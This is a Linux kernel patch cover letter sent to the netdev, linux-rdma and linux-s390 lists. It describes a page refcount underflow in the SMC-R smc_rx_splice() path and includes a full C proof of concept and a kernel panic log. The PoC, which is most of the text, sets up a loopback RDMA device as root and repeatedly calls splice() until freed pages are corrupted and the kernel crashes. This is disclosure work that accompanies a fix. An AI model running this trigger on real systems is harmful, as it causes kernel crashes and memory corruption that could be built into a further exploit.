Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D8896443AA9
	for <linux-rdma@vger.kernel.org>; Thu, 30 Jul 2026 14:56:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785423367; cv=none; b=BtToh0U+gfSD3hIrOw/v8zr0wL9wDJlW9essllxmx7HJeCcrchsgXn34fQW5JGvtO5uvTLil0WGo/u4KLxwXHnWfu+m/uDwi+sauK3U6Dg9dGSbJTAi019c63CPDlMYxLZsZ3mxs95wJqCKWdDV3pEMDJTqL7vbRS58zJVYtm0Y=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785423367; c=relaxed/simple;
	bh=kp+qcaXg3CDUZUSkLKvx5bcoy107QHVvcNaQ18gelmM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Q4mlWaeu9B4L4fVO9tAwBnCJyMqaAlV8b3djBU8YBYBq0QoXpcjKsMMsv+7abo84rkXEjKJ/S1AqSloCQSz/sI/8alzEeAcbPIc4+WF3z6YQ742iufNFBzqgpQ20JvDqjdiBazII1mlg2hqrGmez3zIhFPTsjrQwIuW2kt2AqnY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=DjCUGfCc; arc=none smtp.client-ip=209.85.210.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="DjCUGfCc"
Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-84e507b079dso1582805b3a.0
        for <linux-rdma@vger.kernel.org>; Thu, 30 Jul 2026 07:56:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785423365; x=1786028165; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=VD/owNpsspCzbNl6molRF9pmQ1ESlFG2whVtOJR4zgE=;
        b=DjCUGfCc0lVhhPnJGK9AUUJtoAAe3bfa0h1wGWMaxPWZuefHw8pVZyq0TuuE/GZih7
         5gB+6db1iY4db28z/alvgH81pjPzRV7raIfIXmm03Ly/0M92klgWAh4YexqYuGMCy88Z
         kb24kbKEuzFl/fzuu3DnkNuL4dLKf04LN6ffRfX94mCnF8iLA308ZYeC7FY0lttMZse+
         LYU+7noy4nEg/8XEjvAC6s0Cxkuo5m/N6//zPHUD3N035yDd+G+051kox+2f268FQbpV
         8c+hT+2jKfQjT5A3qq9jlzQOSKnl7DO5KfSka1rvHLEGo6pvXyhUdH2rTVCoe62jos63
         V8/w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785423365; x=1786028165;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=VD/owNpsspCzbNl6molRF9pmQ1ESlFG2whVtOJR4zgE=;
        b=rCSm66SO2V5pJI90uQhXS4irQJmi+pSMNUtaGslCYAKpkuYusVWZb8Q1g4kel+VRDL
         JdTLwBL6QXTr5ExW2tFQZOZXTA0+x5Ku2xzdpXaxLM7MnH8V+6jy7buZXQ97Uj/ro3X7
         V60ESEHIRI8pL5aCyRCzWqiTWbW5EI81R2TYJlr12x1zy1VftYU/yGZ+vq3wEG1L/u67
         bPSAsY1zXYC+hr07Exba2PU6u18JSkZSCLI4BJhxLokd/q6Un/eC3sTiQNFtKsRuj62h
         aqK6QHWdjHtUHXLP4Syz/xQGyOhVhQetXHGJBPzHp2wS6WmRpOvB3WT81eI1sGwe162Z
         oaYQ==
X-Gm-Message-State: AOJu0Yy9IfzxIJL65TXfD8DgdmqSumsIfBbstcp10anW/elTtDiLNwfb
	+fVf4QGh6cq8pVIdo34D9pcZ55rvu2HNvd9skT1A72v2q17qBYGBN1NZ7RuC8pgj+vNzhw==
X-Gm-Gg: AR+sD11z39gVPyUdDfnACnZ154AkVNHk7ma2OsThRSIsVw2fs2QGOmrAoYO0yRoOoX3
	hnsADmxJKotgtrxRgx0/rb1/shhcnD9OyRf21UAgd1EzrPB0maCNXlpFfG3j5vjzw6Zs7HrsI03
	dvkZwM+qJ7OmiriB8yFpmoTrHOnQmzcmGITzIUD9HNSeb7PM/YVzR7aJxGvu4SE6u2+i0za9ZBV
	x8EHHxuwLXz9AKL2V7WAEOafWGO1EJOIk36CQBsTl/JmcFlodX935Zg2ReIG+HoJwoPS6wuA0VC
	75ILHBkBRHrEpPiA5uE/tUMJfviKvDNZjf5d7CoJOs0A0VS+UYLXeZd4FVjNMCZKv4PloUIXewg
	fVzEwucGHb+HvAFLCa6Afk2gOMOQtcUuvoA2NnHwQ7Hj6H0A/fcAEv1InF6XMqlHuxMTTWxbfR1
	AQl4EmKVNNZIlhpcP0kmLy1t2lkNUaodmBrlJza1NfUQKyNFEt6OiSS+T+GVGaSUR3Yn60PfHU3
	67x
X-Received: by 2002:a05:6a00:3e20:b0:846:f517:ba5a with SMTP id d2e1a72fcca58-84ebc239cddmr2771943b3a.28.1785423365026;
        Thu, 30 Jul 2026 07:56:05 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cbdb78ae98asm2265960a12.1.2026.07.30.07.55.57
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 07:56:04 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-rdma@vger.kernel.org,
	linux-s390@vger.kernel.org,
	netdev@vger.kernel.org
Cc: alibuda@linux.alibaba.com,
	dust.li@linux.alibaba.com,
	sidraya@linux.ibm.com,
	mjambigi@linux.ibm.com,
	tonylu@linux.alibaba.com,
	guwen@linux.alibaba.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	ubraun@linux.ibm.com,
	stefan.raspl@linux.ibm.com,
	vega@nebusec.ai,
	lx24@stu.ynu.edu.cn,
	d4n.for.sec@gmail.com,
	enjou1224z@gmail.com
Subject: [PATCH net v2 0/1] net: smc: smc_rx_splice() can underflow VM page refcounts
Date: Thu, 30 Jul 2026 22:55:51 +0800
Message-ID: <20260730145552.360287-1-enjou1224z@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Daming Li <d4n.for.sec@gmail.com>

From: Daming Li <d4n.for.sec@gmail.com>

Bug details:

The bug is in the VM-backed SMC-R splice path in
`smc_rx_splice()`. It builds a multi-page `splice_pipe_desc` and hands
it to `splice_to_pipe()`, but it does not take page references for all
candidate pages before doing so.

That breaks the splice ownership contract. Pages that are not queued are
released through `smc_rx_spd_release()`, while queued pages are later
released through `smc_rx_pipe_buf_release()`. In the VM-backed path, the
code instead tries to take page references only after `splice_to_pipe()`
returns, and it derives the number of queued pages from a mutated
`offset` value.

As a result, unqueued pages can see a bare `put_page()`, and queued VM
pages can be under-accounted as well. This can underflow page refcounts
on RMB backing pages and lead to use-after-free or double-free-style
page lifecycle corruption, with the crash later surfacing in the SMC-R
or RDMA data path.

Reproducer:

cc -O2 -pthread -Wall -Wextra -o mini_poc mini_poc.c
./mini_poc


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/smc.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef AF_SMC
#define AF_SMC 43
#endif

#ifndef SMC_GENL_FAMILY_NAME
#define SMC_GENL_FAMILY_NAME "SMC_GEN_NETLINK"
#endif
#ifndef SMC_GENL_FAMILY_VERSION
#define SMC_GENL_FAMILY_VERSION 1
#endif
#ifndef SMC_MAX_EID_LEN
#define SMC_MAX_EID_LEN 32
#endif
#ifndef SMC_NETLINK_ADD_UEID
#define SMC_NETLINK_ADD_UEID 10
#endif
#ifndef SMC_NLA_EID_TABLE_ENTRY
#define SMC_NLA_EID_TABLE_ENTRY 1
#endif

#define PNET_FAMILY_NAME "SMC_PNETID"
#define PNET_FAMILY_VERSION 1
#define PNET_CMD_ADD 2
#define PNET_A_NAME 1
#define PNET_A_ETHNAME 2
#define PNET_A_IBNAME 3
#define PNET_A_IBPORT 4

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif
#ifndef NLA_DATA
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#endif
#ifndef NLA_NEXT
#define NLA_NEXT(nla, attrlen) ((attrlen) -= NLA_ALIGN((nla)->nla_len), \
				(struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#endif
#ifndef NLA_OK
#define NLA_OK(nla, len) ((len) >= (int)sizeof(struct nlattr) && \
			  (nla)->nla_len >= sizeof(struct nlattr) && \
			  (nla)->nla_len <= (len))
#endif
#ifndef NLA_TYPE_MASK
#define NLA_TYPE_MASK 0x3fff
#endif

static volatile int server_ready;
static volatile int stop_server;
static int g_port = 27555;

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static int run_cmd(const char *cmd)
{
	int status = system(cmd);

	if (status == -1)
		return -1;
	if (!WIFEXITED(status))
		return -1;
	return WEXITSTATUS(status);
}

static int write_file(const char *path, const char *value)
{
	int fd = open(path, O_WRONLY);
	ssize_t len = strlen(value);

	if (fd < 0)
		return -1;
	if (write(fd, value, len) != len) {
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static int add_attr(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		    const void *data, size_t len)
{
	size_t total = NLA_ALIGN(sizeof(struct nlattr) + len);
	struct nlattr *nla;

	if (NLMSG_ALIGN(nlh->nlmsg_len) + total > maxlen)
		return -1;

	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	nla->nla_type = type;
	nla->nla_len = sizeof(struct nlattr) + len;
	memcpy((char *)nla + sizeof(struct nlattr), data, len);
	memset((char *)nla + nla->nla_len, 0, total - nla->nla_len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + total;
	return 0;
}

static int resolve_family_id(int fd, const char *name)
{
	char buf[1024] = {0};
	char rbuf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh = (struct genlmsghdr *)(nlh + 1);
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct iovec iov = { .iov_base = nlh, .iov_len = 0 };
	struct msghdr msg = {
		.msg_name = &sa,
		.msg_namelen = sizeof(sa),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
	struct msghdr rmsg = {
		.msg_name = &sa,
		.msg_namelen = sizeof(sa),
		.msg_iov = &riov,
		.msg_iovlen = 1,
	};
	ssize_t len;

	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = 1;
	gh->cmd = CTRL_CMD_GETFAMILY;
	gh->version = 1;

	if (add_attr(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME,
		     name, strlen(name) + 1) < 0)
		return -1;

	iov.iov_len = nlh->nlmsg_len;
	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	len = recvmsg(fd, &rmsg, 0);
	if (len < 0)
		return -1;

	for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
	     NLMSG_OK(nh, (unsigned int)len);
	     nh = NLMSG_NEXT(nh, len)) {
		if (nh->nlmsg_type == NLMSG_ERROR)
			return -1;
		if (nh->nlmsg_type != GENL_ID_CTRL)
			continue;

		struct genlmsghdr *g = NLMSG_DATA(nh);
		int rem = nh->nlmsg_len - NLMSG_LENGTH(sizeof(*g));
		struct nlattr *a = (struct nlattr *)((char *)g + sizeof(*g));

		for (; NLA_OK(a, rem); a = NLA_NEXT(a, rem)) {
			if ((a->nla_type & NLA_TYPE_MASK) == CTRL_ATTR_FAMILY_ID)
				return *(uint16_t *)NLA_DATA(a);
		}
	}

	errno = ENOENT;
	return -1;
}

static int send_and_wait_ack(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
	struct msghdr msg = {
		.msg_name = &sa,
		.msg_namelen = sizeof(sa),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	for (;;) {
		char rbuf[8192];
		struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
		struct msghdr rmsg = {
			.msg_name = &sa,
			.msg_namelen = sizeof(sa),
			.msg_iov = &riov,
			.msg_iovlen = 1,
		};
		ssize_t len = recvmsg(fd, &rmsg, 0);

		if (len < 0)
			return -1;

		for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
		     NLMSG_OK(nh, (unsigned int)len);
		     nh = NLMSG_NEXT(nh, len)) {
			if (nh->nlmsg_seq != nlh->nlmsg_seq)
				continue;
			if (nh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e = NLMSG_DATA(nh);

				if (e->error == 0)
					return 0;
				errno = -e->error;
				return -1;
			}
			if (nh->nlmsg_type == NLMSG_DONE)
				return 0;
		}
	}
}

static int add_pnet_mapping(void)
{
	char buf[1024] = {0};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh = (struct genlmsghdr *)(nlh + 1);
	uint8_t port = 1;
	int fd, fam, ret;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0)
		return -1;

	fam = resolve_family_id(fd, PNET_FAMILY_NAME);
	if (fam < 0) {
		close(fd);
		return -1;
	}

	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
	nlh->nlmsg_type = fam;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 101;
	gh->cmd = PNET_CMD_ADD;
	gh->version = PNET_FAMILY_VERSION;

	if (add_attr(nlh, sizeof(buf), PNET_A_NAME, "PNETLO", 7) < 0 ||
	    add_attr(nlh, sizeof(buf), PNET_A_ETHNAME, "lo", 3) < 0 ||
	    add_attr(nlh, sizeof(buf), PNET_A_IBNAME, "rxe_lo", 7) < 0 ||
	    add_attr(nlh, sizeof(buf), PNET_A_IBPORT, &port, sizeof(port)) < 0) {
		close(fd);
		errno = EMSGSIZE;
		return -1;
	}

	ret = send_and_wait_ack(fd, nlh);
	close(fd);
	return ret;
}

static int add_ueid(void)
{
	char buf[1024] = {0};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh = (struct genlmsghdr *)(nlh + 1);
	int fd, fam, ret;
	static const char ueid[SMC_MAX_EID_LEN + 1] =
		"ABCDEFGHIJKLMNOPQRSTUVWX12345678";

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0)
		return -1;

	fam = resolve_family_id(fd, SMC_GENL_FAMILY_NAME);
	if (fam < 0) {
		close(fd);
		return -1;
	}

	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
	nlh->nlmsg_type = fam;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 102;
	gh->cmd = SMC_NETLINK_ADD_UEID;
	gh->version = SMC_GENL_FAMILY_VERSION;

	if (add_attr(nlh, sizeof(buf), SMC_NLA_EID_TABLE_ENTRY,
		     ueid, sizeof(ueid)) < 0) {
		close(fd);
		errno = EMSGSIZE;
		return -1;
	}

	ret = send_and_wait_ack(fd, nlh);
	close(fd);
	return ret;
}

static void drain_pipe(int rfd)
{
	char tmp[8192];

	for (;;) {
		ssize_t n = read(rfd, tmp, sizeof(tmp));

		if (n <= 0)
			break;
	}
}

static void *server_thread(void *arg)
{
	int ls;
	int one = 1;
	struct sockaddr_in addr;
	static char payload[65536];

	(void)arg;

	ls = socket(AF_SMC, SOCK_STREAM, 0);
	if (ls < 0)
		die("server socket(AF_SMC)");

	if (setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("setsockopt(SO_REUSEADDR)");

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(g_port);
	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
		die("inet_pton");

	if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind");
	if (listen(ls, 64) < 0)
		die("listen");

	memset(payload, 'R', sizeof(payload));
	__atomic_store_n(&server_ready, 1, __ATOMIC_RELEASE);

	while (!__atomic_load_n(&stop_server, __ATOMIC_ACQUIRE)) {
		int cs = accept(ls, NULL, NULL);

		if (cs < 0) {
			if (errno == EINTR)
				continue;
			break;
		}

		while (!__atomic_load_n(&stop_server, __ATOMIC_ACQUIRE)) {
			ssize_t n = send(cs, payload, sizeof(payload), 0);

			if (n < 0)
				break;
		}

		close(cs);
	}

	close(ls);
	return NULL;
}

static void run_round(int round)
{
	struct sockaddr_in addr;
	int s, p[2], flags;
	char first;
	char fill[4096];
	int i;

	s = socket(AF_SMC, SOCK_STREAM, 0);
	if (s < 0)
		die("client socket(AF_SMC)");

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(g_port);
	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
		die("inet_pton");

	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("connect");
	if (recv(s, &first, 1, 0) != 1)
		die("recv first byte");
	if (pipe(p) < 0)
		die("pipe");
	if (fcntl(p[1], F_SETPIPE_SZ, 8192) < 0)
		die("F_SETPIPE_SZ");

	flags = fcntl(p[0], F_GETFL, 0);
	if (flags < 0)
		die("fcntl(F_GETFL, read)");
	if (fcntl(p[0], F_SETFL, flags | O_NONBLOCK) < 0)
		die("fcntl(F_SETFL, read)");

	flags = fcntl(p[1], F_GETFL, 0);
	if (flags < 0)
		die("fcntl(F_GETFL, write)");
	if (fcntl(p[1], F_SETFL, flags | O_NONBLOCK) < 0)
		die("fcntl(F_SETFL, write)");

	memset(fill, 0x42, sizeof(fill));
	for (i = 0; i < 20000; i++) {
		ssize_t n;

		drain_pipe(p[0]);
		if (write(p[1], fill, sizeof(fill)) != (ssize_t)sizeof(fill))
			die("prefill write");

		n = splice(s, NULL, p[1], NULL, 65535,
			   SPLICE_F_NONBLOCK | SPLICE_F_MOVE);
		if (n < 0 && errno != EAGAIN && errno != EFAULT)
			die("splice");
	}

	close(p[0]);
	close(p[1]);
	close(s);

	if ((round % 5) == 0)
		fprintf(stderr, "round=%d done\n", round);
}

static void setup_runtime(void)
{
	if (geteuid() != 0) {
		fprintf(stderr, "run as root\n");
		exit(1);
	}

	if (run_cmd("rdma link add rxe_lo type rxe netdev lo >/dev/null 2>&1") != 0)
		die("rdma link add rxe_lo");
	if (add_pnet_mapping() < 0)
		die("add_pnet_mapping");
	if (add_ueid() < 0)
		die("add_ueid");
	if (write_file("/proc/sys/net/smc/smcr_buf_type", "2\n") < 0)
		die("write smcr_buf_type");
}

int main(void)
{
	pthread_t th;
	int r;

	setup_runtime();

	if (pthread_create(&th, NULL, server_thread, NULL)) {
		fprintf(stderr, "pthread_create failed\n");
		return 1;
	}

	while (!__atomic_load_n(&server_ready, __ATOMIC_ACQUIRE))
		usleep(1000);

	for (r = 0; r < 200; r++)
		run_round(r);

	__atomic_store_n(&stop_server, 1, __ATOMIC_RELEASE);

	/* Unblock accept so server thread can exit cleanly if no panic happened. */
	{
		int s = socket(AF_SMC, SOCK_STREAM, 0);

		if (s >= 0) {
			struct sockaddr_in addr;

			memset(&addr, 0, sizeof(addr));
			addr.sin_family = AF_INET;
			addr.sin_port = htons(g_port);
			inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
			connect(s, (struct sockaddr *)&addr, sizeof(addr));
			close(s);
		}
	}

	pthread_join(th, NULL);
	return 0;
}


------END poc.c--------

----BEGIN crash log----

[   99.609149][   T29] audit: type=1400 audit(1781096375.697:35): avc:  denied  { write } for  pid=9261 comm="mini_poc" scontext=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 tcontext=system_u:object_r:unlabeled_t:s0 tclass=smc_socket permissive=1
[   99.612034][ T9261] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x36f30
[   99.614228][ T9261] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
[   99.615006][ T9261] page_type: f0(buddy)
[   99.617554][ T9261] page dumped because: VM_BUG_ON_FOLIO(((unsigned int) folio_ref_count(folio) + 127u <= 127u))
[   99.618643][ T9261] page_owner tracks the page as freed
[   99.619251][ T9261] page last allocated via order 4, migratetype Unmovable, gfp_mask 0xd2dc0(GFP_KERNEL|__GFP_ZERO|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9261, tgid 9261 (mini_poc), ts 99605686630, free_ts 99611922370
[   99.630382][ T9261] page last free pid 9261 tgid 9261 stack trace:
[   99.631009][ T9261]  __free_pages_ok+0x63f/0xe80
[   99.631502][ T9261]  __folio_put+0x320/0x4f0
[   99.631988][ T9261]  smc_rx_pipe_buf_release+0x418/0x4e0
[   99.632561][ T9261]  anon_pipe_read+0x5ac/0x1120
[   99.633048][ T9261]  vfs_read+0xa33/0xc70
[   99.633458][ T9261]  ksys_read+0x1ef/0x240
[   99.633890][ T9261]  do_syscall_64+0x11f/0x860
[   99.634374][ T9261]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   99.635404][ T9261] ------------[ cut here ]------------
[   99.635908][ T9261] kernel BUG at include/linux/mm.h:2051!
[   99.637933][ T9261] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[   99.638597][ T9261] CPU: 1 UID: 0 PID: 9261 Comm: mini_poc Not tainted 7.1.0-rc6-00220-g627366c51145 #4 PREEMPT(full)
[   99.653791][ T9261]  smc_splice_read+0x287/0x420
[   99.654311][ T9261]  sock_splice_read+0xb7/0x120
[   99.655927][ T9261]  do_splice_read+0x285/0x360
[   99.656630][ T9261]  splice_file_to_pipe+0x108/0x120
[   99.657638][ T9261]  do_splice+0x1500/0x1f40
[   99.658867][ T9261]  __do_splice+0x14d/0x270
[   99.659368][ T9261]  __x64_sys_splice+0x18f/0x260
[   99.660107][ T9261]  do_syscall_64+0x11f/0x860
[   99.660521][ T9261]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   99.668234][ T9261] RIP: 0010:smc_rx_recvmsg+0x2573/0x2ca0
[   99.676748][ T9261] Kernel panic - not syncing: Fatal exception


-----END crash log-----

Changes in v2:
- Rebase onto the latest net tree at 14fa65d10f5696b063a7d8d26e8291ea84a2c6ed.
- Keep the offset declaration in its original position per Dust Li.
- Add Reviewed-by tags from Dust Li and Sidraya Jayagond.

Daming Li (1):
  net: smc: fix splice entry lifetime imbalance in smc_rx_splice

net/smc/smc_rx.c | 19 ++++++++++---------
 1 file changed, 10 insertions(+), 9 deletions(-)

-- 
2.34.1
